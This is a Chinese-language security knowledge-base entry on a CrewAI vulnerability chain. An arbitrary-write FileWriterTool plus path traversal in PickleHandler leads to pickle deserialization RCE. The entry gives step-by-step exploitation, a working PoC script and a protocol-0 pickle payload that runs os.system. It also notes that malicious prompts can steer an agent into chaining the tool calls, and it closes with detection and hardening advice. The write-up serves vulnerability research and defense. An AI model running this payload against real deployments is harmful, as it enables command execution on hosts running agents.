---
id: ai-security-agent-security-crewai-filewriter-picklehandler-chain-rce
title: CrewAI FileWriterTool + PickleHandler 组合链：任意写 pickle + ../ 穿越 + pickle.load RCE
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: crewai-filewriter-picklehandler-chain-rce
aliases:
- CrewAI RCE
- FileWriterTool 任意文件写入
- PickleHandler 路径穿越
- pickle 协议 0 ASCII 载荷
- CrewAI 工具链 RCE
- crewai-tools 文件写入
- os.getcwd 拼接穿越
tags:
- ai-security
- agent-security
- crewai
- tool-chain
- file-write
- path-traversal
- pickle
- deserialization
- rce
- python
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: crewai <= 1.0.0a2；crewai-tools <= 1.0.0a2（修复版本待发布）
verification:
  verified_by: verifier-166
  verified_at: '2026-11-06T09:45:47+08:00'
  notes: 已对照原文与全部 4 张图核对：FileWriterTool 无路径校验、PickleHandler os.path.join+../ 穿越、协议0 ASCII pickle 经文本模式写入并实际触发 RCE（图04 显示 RCE_EXECUTED）。已修正正文误植的 n8n 字样；未在本机复跑 PoC
---

## 一句话结论

CrewAI 的 `FileWriterTool` 对 `directory`/`filename` 没有任何路径限制，可把内容写到任意目录；`PickleHandler` 只用 `os.path.join(os.getcwd(), file_name)` 拼接路径、不规范化 `../`，因此可穿越到工作目录外；两者组合时，攻击者先用 `FileWriterTool` 写入协议 0 的 ASCII pickle，再用 `PickleHandler("../attack/malicious.pkl").load()` 触发 `pickle.load()`，执行 `__reduce__` 中的命令，获得 CrewAI 进程权限下的 RCE。

## 原理

- **FileWriterTool 任意写**：`_run` 中先按 `directory` 创建目录，再用 `os.path.join(directory or "", filename)` 拼路径，`mode = "w" if overwrite else "x"` 直接 `open(filepath, mode).write(content)`。没有 `realpath`、`commonpath`、前缀校验或目录白名单，`directory` 可以是 `/tmp`、`/var/tmp`、应用可写的任意目录，`filename` 可带子路径。
- **文本模式写 pickle 的限制与绕过**：`FileWriterTool` 使用文本模式（`"w"`），普通 pickle（协议 2+）是二进制，直接写会编码失败。pickle 协议 0 是纯 ASCII 操作码流（如 `cposix\nsystem\np0\n(Vecho ...\ntp2\nRp3\n.`），可用 `latin-1` 解码为字符串交给 `file.write`；后续 `pickle.load` 以二进制方式读取时仍能正确解析协议 0，因此文本模式不构成阻碍。
- **PickleHandler 路径穿越**：`__init__` 在文件名不以 `.pkl` 结尾时自动补后缀，然后 `self.file_path = os.path.join(os.getcwd(), file_name)`。`os.path.join` 只做字符串拼接，不会把 `..` 规范化，所以 `../attack/malicious.pkl` 得到 `/tmp/work/../attack/malicious.pkl`，实际指向 `/tmp/attack/malicious.pkl`；在 POSIX 上若 `file_name` 是绝对路径，`os.path.join` 会直接丢弃 cwd，同样逃逸。
- **不安全反序列化**：`load()` 检查文件存在且非空后执行 `pickle.load(file)`，源码里甚至保留了 `# noqa: S301` 来压制 Bandit 的“反序列化不可信数据”告警。`pickle.load` 会按操作码导入模块并调用可调用对象，攻击者用 `__reduce__` 返回 `(os.system, (command,))` 即可在反序列化时执行命令。
- **组合链的意义**：单独看，`FileWriterTool` 是一个“任意文件写入”原语，`PickleHandler` 是一个“路径穿越 + 不安全反序列化”原语；组合后不需要目标机器上已有恶意文件，也不需要预先上传，写入与加载都在同一进程内完成，形成完整 RCE 链。对于 AI Agent 场景，工具参数通常由模型根据任务/外部输入生成，若 `FileWriterTool` 与 `PickleHandler` 同时暴露给 Agent，恶意提示词或不可信任务内容可以诱导 Agent 先写后读，从而把“工具调用”升级为主机命令执行。
- **影响范围**：以运行 CrewAI 的 Python 进程权限为准；在容器/虚拟环境中通常为服务账号，可读写挂载目录、环境变量与内网可达资源。

## 触发条件

- 目标使用 crewai <= 1.0.0a2、crewai-tools <= 1.0.0a2（或包含相同实现的版本）。
- 攻击者可控制 `FileWriterTool.run` 的 `directory`、`filename`、`content` 参数，或可诱导 Agent 调用该工具写入可控内容；同时可控制 `PickleHandler` 的 `file_name`，或应用会把用户可控路径交给 `PickleHandler`。
- 运行进程对写入目录有写权限；`PickleHandler` 的工作目录与写入目录存在可穿越的相对关系（或允许绝对路径）。
- 应用会调用 `handler.load()` 读取该文件；若只写不读，链不闭环。
- 没有额外的路径沙箱/只读挂载/系统调用过滤阻止写入与 `pickle.load`。

## 利用步骤

1. 生成协议 0 的恶意 pickle，`__reduce__` 返回 `os.system` 与命令：
   ```python
   import pickle, os
   class MaliciousPayload:
       def __reduce__(self):
           return (os.system, ('echo RCE_EXECUTED > /tmp/rce_marker.txt',))
   pickle_str = pickle.dumps(MaliciousPayload(), protocol=0).decode('latin-1')
   ```
2. 用 `FileWriterTool` 写入攻击目录：
   ```python
   from crewai_tools.tools.file_writer_tool.file_writer_tool import FileWriterTool
   FileWriterTool().run(
       directory="/tmp/attack",
       filename="malicious.pkl",
       content=pickle_str,
       overwrite=True,
   )
   ```
3. 让应用的工作目录位于另一个目录（如 `/tmp/work`），构造穿越路径：
   ```python
   from crewai.utilities.file_handler import PickleHandler
   handler = PickleHandler("../attack/malicious.pkl")
   # file_path = /tmp/work/../attack/malicious.pkl → /tmp/attack/malicious.pkl
   ```
4. 调用 `handler.load()`，触发 `pickle.load` 与 `__reduce__`，命令执行；检查标记文件确认 RCE。
5. 在 Agent 场景中，把上述两步包装为工具调用序列：先让 Agent 调用 FileWriterTool 写入 `.pkl`，再让应用/工具调用 PickleHandler 加载该路径；或直接篡改工具参数实现同等效果。

## PoC

最小验证代码（仅防御研究，未在本机执行）：

```python
import os, pickle, tempfile
from crewai.utilities.file_handler import PickleHandler
from crewai_tools.tools.file_writer_tool.file_writer_tool import FileWriterTool

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('echo RCE_EXECUTED > /tmp/rce_marker.txt',))

payload = pickle.dumps(MaliciousPayload(), protocol=0).decode('latin-1')

base = tempfile.mkdtemp()
work, attack = os.path.join(base, 'work'), os.path.join(base, 'attack')
os.makedirs(work); os.makedirs(attack)

FileWriterTool().run(directory=attack, filename='malicious.pkl', content=payload, overwrite=True)

os.chdir(work)
PickleHandler('../attack/malicious.pkl').load()

assert open('/tmp/rce_marker.txt').read().strip() == 'RCE_EXECUTED'
```

协议 0 载荷示例（`cat` 可见的 ASCII 形式）：

```text
cposix
system
p0
(Vecho "RCE_EXECUTED" > /tmp/rce_marker.txt
p1
tp2
Rp3
.
```

## 变体与关联

- 变体：`PickleHandler` 使用绝对路径（POSIX 下 `os.path.join(cwd, '/tmp/attack/malicious.pkl')` 返回绝对路径）绕过 cwd 限制；用 `../../` 多级穿越；把恶意文件写进应用随后会扫描/加载的目录。
- 变体：其他 Agent 文件写入工具（无路径校验）与任何 `pickle.load`/`joblib.load`/`torch.load` sink 组合；协议 0 之外，若写入工具支持二进制/`latin-1` 编码，也可写协议 2+ 载荷。
- 关联：[[web-python-deserialization-django-file-cache-pickle-rce]]（文件缓存投毒触发 pickle）、[[web-python-deserialization-ply-yacc-picklefile-rce]]（路径可控即 pickle.load）、[[ai-security-agent-security-agent-tool-file-hotload-backdoor-persistence]]（Agent 工具写入后门）、[[ai-security-agent-security-file-read-tool-symlink-realpath-bypass]]（Agent 文件工具路径边界绕过）。

## 检测与防御

- **升级/修补**：关注 crewai/crewai-tools 修复版本；在 `FileWriterTool` 中加入目录白名单与 `os.path.realpath` + `os.path.commonpath` 包含校验，拒绝绝对路径与 `..`；在 `PickleHandler` 中同样做 realpath 边界检查，禁止绝对路径与穿越。
- **根除 pickle sink**：不要对不可信路径调用 `pickle.load`；改用 JSON/MessagePack 等安全格式，或使用 `pickletools` 白名单校验、受限 Unpickler。无法替换时，至少确保文件只能来自受控目录且不可被攻击者写入。
- **Agent 工具权限**：不要把 FileWriterTool 这类任意写工具与可加载文件的工具同时暴露给不可信 Agent；对文件写入/加载加 HITL 审批、参数白名单、目录限制；Agent 运行在只读文件系统/低权限容器中，限制 `os.system`/`child_process` 能力。
- **检测特征**：AI 服务进程出现 `sh -c`/`os.system` 子进程；写入文件名以 `.pkl` 结尾且路径含 `..` 或落在工作目录外；pickle 文件内容以 `cposix`、`c__builtin__`、`cos` 等协议 0 操作码开头；同一进程短时间内先写 `.pkl` 再读取。
- **日志与审计**：记录工具调用的 `directory`、`filename`、`file_name` 参数；对含 `../`、绝对路径、`.pkl` 的调用告警；监控 `pickle.load` 相关异常与命令执行。
